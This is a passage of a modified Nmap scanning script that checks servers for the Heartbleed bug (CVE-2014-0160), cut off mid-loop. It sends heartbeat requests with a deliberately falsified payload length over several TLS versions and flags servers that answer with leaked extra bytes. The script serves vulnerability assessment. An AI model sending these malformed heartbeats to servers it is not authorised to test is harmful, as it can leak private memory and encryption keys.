description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
The code is based on the Python script ssltest.py authored by Jared Stafford (jspenguin@jspenguin.org)
Improvised by  @pr4jwal
]]

---
-- @usage
-- nmap -p 443 --script ssl-heartbleed <target>
-- Improvised by Prajwal Panchmahalkar @pr4jwal
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     prop: booya
-- |     Description:
-- |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-- |
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://www.openssl.org/news/secadv_20140407.txt
-- |_      http://cvedetails.com/cve/2014-0160/
--
--
-- @args ssl-heartbleed.protocols (default tries all) TLS 1.0, TLS 1.1, or TLS 1.2
--

local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local string = require('string')
local table = require('table')
local vulns = require('vulns')
local have_tls, tls = pcall(require,'tls')
assert(have_tls, "This script requires the tls.lua library from http://nmap.org/nsedoc/lib/tls.html")

author = "Patrik Karlsson <patrik@cqure.net> improvised by Prajwal Panchmahalkar"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

local arg_protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLSv1.0', 'TLSv1.1', 'TLSv1.2'}

portrule = function(host, port)
  return shortport.ssl(host, port) or sslcert.isPortSupported(port)
end

local function recvhdr(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record header - server closed connection')
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  return status, typ, ver, ln
end

local function recvmsg(s, len)
  local status, pay = s:receive_buf(match.numbytes(len), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record payload - server closed connection')
    return
  end
  return true, pay
end

local function keys(t)
  local ret = {}
  for k, _ in pairs(t) do
    ret[#ret+1] = k
  end
  return ret
end

local function testversion(host, port, version)

  local hello = tls.client_hello({
      ["protocol"] = version,
      ["ciphers"] = {
        
"TLS_NULL_WITH_NULL_NULL",
"TLS_RSA_WITH_NULL_MD5",
"TLS_RSA_WITH_NULL_SHA",
"TLS_RSA_EXPORT_WITH_RC4_40_MD5",
"TLS_RSA_WITH_RC4_128_MD5",
"TLS_RSA_WITH_RC4_128_SHA",
"TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5",
"TLS_RSA_WITH_IDEA_CBC_SHA",
"TLS_RSA_EXPORT_WITH_DES40_CBC_SHA",
"TLS_RSA_WITH_DES_CBC_SHA",
"TLS_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA",
"TLS_DH_DSS_WITH_DES_CBC_SHA",
"TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA",
"TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA",
"TLS_DH_RSA_WITH_DES_CBC_SHA",
"TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA",
"TLS_DHE_DSS_WITH_DES_CBC_SHA",
"TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA",
"TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA",
"TLS_DHE_RSA_WITH_DES_CBC_SHA",
"TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_DH_anon_EXPORT_WITH_RC4_40_MD5",
"TLS_DH_anon_WITH_RC4_128_MD5",
"TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA",
"TLS_DH_anon_WITH_DES_CBC_SHA",
"TLS_DH_anon_WITH_3DES_EDE_CBC_SHA",
"SSL_FORTEZZA_KEA_WITH_NULL_SHA",
"SSL_FORTEZZA_KEA_WITH_FORTEZZA_CBC_SHA",
"TLS_KRB5_WITH_DES_CBC_SHA-or-SSL_FORTEZZA_KEA_WITH_RC4_128_SHA",
"TLS_KRB5_WITH_3DES_EDE_CBC_SHA",
"TLS_KRB5_WITH_RC4_128_SHA",
"TLS_KRB5_WITH_IDEA_CBC_SHA",
"TLS_KRB5_WITH_DES_CBC_MD5",
"TLS_KRB5_WITH_3DES_EDE_CBC_MD5",
"TLS_KRB5_WITH_RC4_128_MD5",
"TLS_KRB5_WITH_IDEA_CBC_MD5",
"TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA",
"TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA",
"TLS_KRB5_EXPORT_WITH_RC4_40_SHA",
"TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5",
"TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5",
"TLS_KRB5_EXPORT_WITH_RC4_40_MD5",
"TLS_PSK_WITH_NULL_SHA",
"TLS_DHE_PSK_WITH_NULL_SHA",
"TLS_RSA_PSK_WITH_NULL_SHA",
"TLS_RSA_WITH_AES_128_CBC_SHA",
"TLS_DH_DSS_WITH_AES_128_CBC_SHA",
"TLS_DH_RSA_WITH_AES_128_CBC_SHA",
"TLS_DHE_DSS_WITH_AES_128_CBC_SHA",
"TLS_DHE_RSA_WITH_AES_128_CBC_SHA",
"TLS_DH_anon_WITH_AES_128_CBC_SHA",
"TLS_RSA_WITH_AES_256_CBC_SHA",
"TLS_DH_DSS_WITH_AES_256_CBC_SHA",
"TLS_DH_RSA_WITH_AES_256_CBC_SHA",
"TLS_DHE_DSS_WITH_AES_256_CBC_SHA",
"TLS_DHE_RSA_WITH_AES_256_CBC_SHA",
"TLS_DH_anon_WITH_AES_256_CBC_SHA",
"TLS_RSA_WITH_NULL_SHA256",
"TLS_RSA_WITH_AES_128_CBC_SHA256",
"TLS_RSA_WITH_AES_256_CBC_SHA256",
"TLS_DH_DSS_WITH_AES_128_CBC_SHA256",
"TLS_DH_RSA_WITH_AES_128_CBC_SHA256",
"TLS_DHE_DSS_WITH_AES_128_CBC_SHA256",
"TLS_RSA_WITH_CAMELLIA_128_CBC_SHA",
"TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA",
"TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA",
"TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA",
"TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA",
"TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA",
"TLS_ECDH_ECDSA_WITH_NULL_SHA-draft",
"TLS_ECDH_ECDSA_WITH_RC4_128_SHA-draft",
"TLS_ECDH_ECDSA_WITH_DES_CBC_SHA-draft",
"TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA-draft",
"TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA-draft",
"TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA-draft",
"TLS_ECDH_ECNRA_WITH_DES_CBC_SHA-draft",
"TLS_ECDH_ECNRA_WITH_3DES_EDE_CBC_SHA-draft",
"TLS_ECMQV_ECDSA_NULL_SHA-draft",
"TLS_ECMQV_ECDSA_WITH_RC4_128_SHA-draft",
"TLS_ECMQV_ECDSA_WITH_DES_CBC_SHA-draft",
"TLS_ECMQV_ECDSA_WITH_3DES_EDE_CBC_SHA-draft",
"TLS_ECMQV_ECNRA_NULL_SHA-draft",
"TLS_ECMQV_ECNRA_WITH_RC4_128_SHA-draft",
"TLS_ECMQV_ECNRA_WITH_DES_CBC_SHA-draft",
"TLS_ECMQV_ECNRA_WITH_3DES_EDE_CBC_SHA-draft",
"TLS_ECDH_anon_NULL_WITH_SHA-draft",
"TLS_ECDH_anon_WITH_RC4_128_SHA-draft",
"TLS_ECDH_anon_WITH_DES_CBC_SHA-draft",
"TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA-draft",
"TLS_ECDH_anon_EXPORT_WITH_DES40_CBC_SHA-draft",
"TLS_ECDH_anon_EXPORT_WITH_RC4_40_SHA-draft",
"TLS_RSA_EXPORT1024_WITH_RC4_56_MD5",
"TLS_RSA_EXPORT1024_WITH_RC2_CBC_56_MD5",
"TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA",
"TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA",
"TLS_RSA_EXPORT1024_WITH_RC4_56_SHA",
"TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA",
"TLS_DHE_DSS_WITH_RC4_128_SHA",
"TLS_DHE_RSA_WITH_AES_128_CBC_SHA256",
"TLS_DH_DSS_WITH_AES_256_CBC_SHA256",
"TLS_DH_RSA_WITH_AES_256_CBC_SHA256",
"TLS_DHE_DSS_WITH_AES_256_CBC_SHA256",
"TLS_DHE_RSA_WITH_AES_256_CBC_SHA256",
"TLS_DH_anon_WITH_AES_128_CBC_SHA256",
"TLS_DH_anon_WITH_AES_256_CBC_SHA256",
"TLS_DHE_DSS_WITH_3DES_EDE_CBC_RMD",
"TLS_DHE_DSS_WITH_AES_128_CBC_RMD",
"TLS_DHE_DSS_WITH_AES_256_CBC_RMD",
"TLS_DHE_RSA_WITH_3DES_EDE_CBC_RMD",
"TLS_DHE_RSA_WITH_AES_128_CBC_RMD",
"TLS_DHE_RSA_WITH_AES_256_CBC_RMD",
"TLS_RSA_WITH_3DES_EDE_CBC_RMD",
"TLS_RSA_WITH_AES_128_CBC_RMD",
"TLS_RSA_WITH_AES_256_CBC_RMD",
"TLS_GOSTR341094_WITH_28147_CNT_IMIT",
"TLS_GOSTR341001_WITH_28147_CNT_IMIT",
"TLS_GOSTR341094_WITH_NULL_GOSTR3411",
"TLS_GOSTR341001_WITH_NULL_GOSTR3411",
"TLS_RSA_WITH_CAMELLIA_256_CBC_SHA",
"TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA",
"TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA",
"TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA",
"TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA",
"TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA",
"TLS_PSK_WITH_RC4_128_SHA",
"TLS_PSK_WITH_3DES_EDE_CBC_SHA",
"TLS_PSK_WITH_AES_128_CBC_SHA",
"TLS_PSK_WITH_AES_256_CBC_SHA",
"TLS_DHE_PSK_WITH_RC4_128_SHA",
"TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA",
"TLS_DHE_PSK_WITH_AES_128_CBC_SHA",
"TLS_DHE_PSK_WITH_AES_256_CBC_SHA",
"TLS_RSA_PSK_WITH_RC4_128_SHA",
"TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA",
"TLS_RSA_PSK_WITH_AES_128_CBC_SHA",
"TLS_RSA_PSK_WITH_AES_256_CBC_SHA",
"TLS_RSA_WITH_SEED_CBC_SHA",
"TLS_DH_DSS_WITH_SEED_CBC_SHA",
"TLS_DH_RSA_WITH_SEED_CBC_SHA",
"TLS_DHE_DSS_WITH_SEED_CBC_SHA",
"TLS_DHE_RSA_WITH_SEED_CBC_SHA",
"TLS_DH_anon_WITH_SEED_CBC_SHA",
"TLS_RSA_WITH_AES_128_GCM_SHA256",
"TLS_RSA_WITH_AES_256_GCM_SHA384",
"TLS_DHE_RSA_WITH_AES_128_GCM_SHA256",
"TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
"TLS_DH_RSA_WITH_AES_128_GCM_SHA256",
"TLS_DH_RSA_WITH_AES_256_GCM_SHA384",
"TLS_DHE_DSS_WITH_AES_128_GCM_SHA256",
"TLS_DHE_DSS_WITH_AES_256_GCM_SHA384",
"TLS_DH_DSS_WITH_AES_128_GCM_SHA256",
"TLS_DH_DSS_WITH_AES_256_GCM_SHA384",
"TLS_DH_anon_WITH_AES_128_GCM_SHA256",
"TLS_DH_anon_WITH_AES_256_GCM_SHA384",
"TLS_PSK_WITH_AES_128_GCM_SHA256",
"TLS_PSK_WITH_AES_256_GCM_SHA384",
"TLS_DHE_PSK_WITH_AES_128_GCM_SHA256",
"TLS_DHE_PSK_WITH_AES_256_GCM_SHA384",
"TLS_RSA_PSK_WITH_AES_128_GCM_SHA256",
"TLS_RSA_PSK_WITH_AES_256_GCM_SHA384",
"TLS_PSK_WITH_AES_128_CBC_SHA256",
"TLS_PSK_WITH_AES_256_CBC_SHA384",
"TLS_PSK_WITH_NULL_SHA256",
"TLS_PSK_WITH_NULL_SHA384",
"TLS_DHE_PSK_WITH_AES_128_CBC_SHA256",
"TLS_DHE_PSK_WITH_AES_256_CBC_SHA384",
"TLS_DHE_PSK_WITH_NULL_SHA256",
"TLS_DHE_PSK_WITH_NULL_SHA384",
"TLS_RSA_PSK_WITH_AES_128_CBC_SHA256",
"TLS_RSA_PSK_WITH_AES_256_CBC_SHA384",
"TLS_RSA_PSK_WITH_NULL_SHA256",
"TLS_RSA_PSK_WITH_NULL_SHA384",
"TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_EMPTY_RENEGOTIATION_INFO_SCSV",
"TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256",
"TLS_ECDH_ECDSA_WITH_NULL_SHA",
"TLS_ECDH_ECDSA_WITH_RC4_128_SHA",
"TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA",
"TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA",
"TLS_ECDHE_ECDSA_WITH_NULL_SHA",
"TLS_ECDHE_ECDSA_WITH_RC4_128_SHA",
"TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
"TLS_ECDH_RSA_WITH_NULL_SHA",
"TLS_ECDH_RSA_WITH_RC4_128_SHA",
"TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDH_RSA_WITH_AES_128_CBC_SHA",
"TLS_ECDH_RSA_WITH_AES_256_CBC_SHA",
"TLS_ECDHE_RSA_WITH_NULL_SHA",
"TLS_ECDHE_RSA_WITH_RC4_128_SHA",
"TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
"TLS_ECDH_anon_WITH_NULL_SHA",
"TLS_ECDH_anon_WITH_RC4_128_SHA",
"TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDH_anon_WITH_AES_128_CBC_SHA",
"TLS_ECDH_anon_WITH_AES_256_CBC_SHA",
"TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA",
"TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA",
"TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA",
"TLS_SRP_SHA_WITH_AES_128_CBC_SHA",
"TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA",
"TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA",
"TLS_SRP_SHA_WITH_AES_256_CBC_SHA",
"TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA",
"TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA",
"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256",
"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384",
"TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256",
"TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384",
"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256",
"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384",
"TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256",
"TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384",
"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDHE_PSK_WITH_RC4_128_SHA",
"TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA",
"TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA",
"TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA",
"TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256",
"TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384",
"TLS_ECDHE_PSK_WITH_NULL_SHA",
"TLS_ECDHE_PSK_WITH_NULL_SHA256",
"TLS_ECDHE_PSK_WITH_NULL_SHA384",
"TLS_RSA_WITH_ARIA_128_CBC_SHA256",
"TLS_RSA_WITH_ARIA_256_CBC_SHA384",
"TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256",
"TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384",
"TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256",
"TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384",
"TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256",
"TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384",
"TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256",
"TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384",
"TLS_DH_anon_WITH_ARIA_128_CBC_SHA256",
"TLS_DH_anon_WITH_ARIA_256_CBC_SHA384",
"TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256",
"TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384",
"TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256",
"TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384",
"TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256",
"TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384",
"TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256",
"TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384",
"TLS_RSA_WITH_ARIA_128_GCM_SHA256",
"TLS_RSA_WITH_ARIA_256_GCM_SHA384",
"TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256",
"TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384",
"TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256",
"TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384",
"TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256",
"TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384",
"TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256",
"TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384",
"TLS_DH_anon_WITH_ARIA_128_GCM_SHA256",
"TLS_DH_anon_WITH_ARIA_256_GCM_SHA384",
"TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256",
"TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384",
"TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256",
"TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384",
"TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256",
"TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384",
"TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256",
"TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384",
"TLS_PSK_WITH_ARIA_128_CBC_SHA256",
"TLS_PSK_WITH_ARIA_256_CBC_SHA384",
"TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256",
"TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384",
"TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256",
"TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384",
"TLS_PSK_WITH_ARIA_128_GCM_SHA256",
"TLS_PSK_WITH_ARIA_256_GCM_SHA384",
"TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256",
"TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384",
"TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256",
"TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384",
"TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256",
"TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384",
"TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256",
"TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384",
"TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256",
"TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384",
"TLS_RSA_WITH_AES_128_CCM",
"TLS_RSA_WITH_AES_256_CCM",
"TLS_DHE_RSA_WITH_AES_128_CCM",
"TLS_DHE_RSA_WITH_AES_256_CCM",
"TLS_RSA_WITH_AES_128_CCM_8",
"TLS_RSA_WITH_AES_256_CCM_8",
"TLS_DHE_RSA_WITH_AES_128_CCM_8",
"TLS_DHE_RSA_WITH_AES_256_CCM_8",
"TLS_PSK_WITH_AES_128_CCM",
"TLS_PSK_WITH_AES_256_CCM",
"TLS_DHE_PSK_WITH_AES_128_CCM",
"TLS_DHE_PSK_WITH_AES_256_CCM",
"TLS_PSK_WITH_AES_128_CCM_8",
"TLS_PSK_WITH_AES_256_CCM_8",
"TLS_PSK_DHE_WITH_AES_128_CCM_8",
"TLS_PSK_DHE_WITH_AES_256_CCM_8",
"TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
"TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
"TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
"SSL_RSA_FIPS_WITH_DES_CBC_SHA",
"SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA",

      },
      ["compressors"] = {"NULL"},
      ["extensions"] = {
        -- Claim to support every elliptic curve
        ["elliptic_curves"] = tls.EXTENSION_HELPERS["elliptic_curves"](keys(tls.ELLIPTIC_CURVES)),
        -- Claim to support every EC point format
        ["ec_point_formats"] = tls.EXTENSION_HELPERS["ec_point_formats"](keys(tls.EC_POINT_FORMATS)),
        ["heartbeat"] = "\x01", -- peer_not_allowed_to_send
      },
    })

  local payload = "Nmap ssl-heartbleed"
  local hb = tls.record_write("heartbeat", "TLSv1.1", bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x0fe9, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )

 local hb1 = tls.record_write("heartbeat", "TLSv1.2", bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x0fe9, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )
 local hb2 = tls.record_write("heartbeat", "TLSv1.0", bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x0fe9, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )

 local hb3 = tls.record_write("heartbeat", "SSLv3", bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x0fe9, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )
  local s
  local specialized = sslcert.getPrepareTLSWithoutReconnect(port)
  if specialized then
    local status
    status, s = specialized(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  else
    s = nmap.new_socket()
    local status = s:connect(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  end

  s:set_timeout(5000)

  if not s:send(hello) then
    stdnse.print_debug(3, "Failed to send packet to server")
    return
  end

  while(true) do
    local status, typ, ver, pay, len
    status, typ, ver, len = recvhdr(s)
    if not status or ver ~= tls.PROTOCOLS[version] then
      return
    end
    status, pay = recvmsg(s, len)
    if ( typ == 22 and string.byte(pay,1) == 14 ) then break end
  end

  s:send(hb)
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(1, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(1, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(1, 'Server returned error, likely not vulnerable')
      break
    end
  end

  s:send(hb1)
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(1, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(1, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(1, 'Server returned error, likely not vulnerable')
      break
    end
  end


  s:send(hb2)
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(1, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(1, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
